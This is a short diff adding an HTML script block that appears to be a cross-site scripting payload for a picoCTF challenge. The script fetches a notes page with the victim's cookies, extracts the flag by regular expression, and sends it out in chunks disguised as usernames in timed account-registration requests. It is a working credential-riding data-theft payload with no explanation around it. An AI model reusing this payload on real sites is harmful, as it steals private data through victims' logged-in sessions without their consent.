@@ -1,0 +1,15 @@
+<script>
+fetch('http://0.0.0.0:8080/notes',{credentials:'include'})
+.then(r=>r.text())
+.then(h=>{
+let m=h.match(/picoCTF\{[^}]+\}/);
+if(m){
+let flag=m[0];
+for(let i=0;i<Math.ceil(flag.length/25);i++){
+setTimeout(()=>{
+fetch('http://0.0.0.0:8080/register',{method:'POST',body:new URLSearchParams({username:'r'+i+'_'+flag.substring(i*25,(i+1)*25),password:'x'})});
+},i*800);
+}
+}
+});
+</script>
